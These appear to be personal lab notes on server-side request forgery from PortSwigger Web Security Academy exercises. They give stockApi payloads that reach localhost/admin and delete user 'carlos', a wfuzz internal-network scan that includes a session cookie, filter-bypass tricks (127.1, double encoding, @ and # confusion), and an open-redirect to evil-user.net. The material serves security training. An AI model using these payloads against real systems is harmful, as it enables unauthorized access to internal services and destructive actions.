
**Legit request:**

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```


**attack vector:**

`stockApi=`

**Attack req:**

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://localhost/admin
```

`stockApi=http://127.0.0.1/admin`

**Lab:**

`stockApi=http%3A%2F%2Flocalhost%2Fadmin`

`stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3fusername%3dcarlos`


**wfuzz to scan network:**

```
wfuzz -c -z range,1-255 -d "stockApi=http://192.168.0.%s:8080/admin" 
-H "Host: 0a19009f0465ca8f80355d4600e60008.web-security-academy.net" 
-H "Cookie: session=ToNm50JKClOnHmBKM5w2IyXeKlxutFCL" 
-H "Content-Type: application/x-www-form-urlencoded" 
-H "Sec-Ch-Ua-Platform: \"Linux\"" 
-H "Accept-Language: en-US,en;q=0.9" 
-H "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" 
-H "Sec-Ch-Ua-Mobile: ?0" 
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36" -H "Accept: */*" 
-H "Origin: https://0a19009f0465ca8f80355d4600e60008.web-security-academy.net" 
-H "Sec-Fetch-Site: same-origin" 
-H "Sec-Fetch-Mode: cors" 
-H "Sec-Fetch-Dest: empty" 
-H "Referer: https://0a19009f0465ca8f80355d4600e60008.web-security-academy.net/product?productId=13" 
-H "Accept-Encoding: gzip, deflate, br" 
-H "Priority: u=1, i" 
https://0a19009f0465ca8f80355d4600e60008.web-security-academy.net/product/stock
```


**SSRF hacktricks:**

#### blacklist-based input filters

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.
 
** lab:**

`stockApi=http%3A%2F%2Flocalhost%2Fadmin` did not work

trying `localhost` --> `127.0.0.1` & `127.1`

`stockApi=http%3A%2F%2F127.0.0.1%2Fadmin`
`stockApi=http%3A%2F%2F127.1%2Fadmin`

trying double URL encoding for admin path

`stockApi=http%3A%2F%2F127.1%2F%2561%2564%256d%2569%256e`

`stockApi=http%3A%2F%2F127.1%2F%2561%2564%256d%2569%256e`

- double encoding worked `localhost` --> `127.1`   |    `admin` --> `%2561%2564%256d%2569%256e`

- deleting user account carlos
`stockApi=http%3A%2F%2F127.1%2F%2561%2564%256d%2569%256e%2Fdelete%3fusername%3dcarlos`




#### whitelist-based input filters


- You can embed credentials in a URL before the hostname, using the `@` character. For example:
    `https://expected-host:fakepassword@evil-host`
- You can use the `#` character to indicate a URL fragment. For example:
    `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    `https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding) characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- You can use combinations of these techniques together.


**Lab:**


blocked reqs:

`stockApi=http%3A%2F%2Fstock.weliketoshop.net@localhost%2F%2561%2564%256d%2569%256e`
`stockApi=http%3A%2F%2Fstock.weliketoshop.net%2540localhost%2F%2561%2564%256d%2569%256e`
`stockApi=http%3A%2F%2Fstock.weliketoshop.net%2532localhost%2F%2561%2564%256d%2569%256e`

`stockApi=http%3A%2F%2Flocalhost@stock.weliketoshop.net%2F%2561%2564%256d%2569%256`




`stockApi=http%3A%2F%2Flocalhost%2523@stock.weliketoshop.net%2F%2561%2564%256d%2569%256e%2Fdelete%3fusername%3dcarlos`


```
http://localhost#@stock.weliketoshop.net/admin
```

- The `#` appears between `localhost` and `@stock.weliketoshop.net/admin`, which is unusual. The fragment identifier typically follows the domain, but `localhost#` would make the rest of the URL after `#` be treated as part of the fragment (i.e., the server and path after `#` might not be recognized as part of the URL at all).

#### What’s likely happening here:

- **Malformed URL**: The `#` symbol is causing the part after it to be treated as a **fragment**, meaning the `@stock.weliketoshop.net/admin` part would be ignored by the server and instead processed client-side as a fragment identifier.
- **The `@` symbol**: If there was supposed to be authentication info (username and password), this part would typically go before the `@` symbol, but it's not formatted properly.





Now instead of fetching the URL directly we may also utilize the redirect option if one if available

`/product/nextProduct?currentProductId=6&path=http://evil-user.net`


